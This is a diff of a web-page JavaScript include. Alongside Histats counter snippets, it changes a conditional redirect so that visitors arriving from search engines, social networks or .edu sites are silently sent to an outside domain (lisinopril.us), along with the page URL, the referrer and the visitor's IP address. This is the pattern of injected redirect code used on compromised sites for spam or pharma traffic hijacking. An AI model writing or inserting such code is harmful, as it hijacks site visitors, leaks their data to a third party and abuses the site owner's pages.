@@ -1,5 +1,5 @@
 ///// Histats /////
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4909422&101"width="0" height="0"/>');
 
 ///// Statcounter /////
 
@@ -17,5 +17,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'https://stocks.wowlazy.com';
+var ars = 'https://lisinopril.us';
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae }
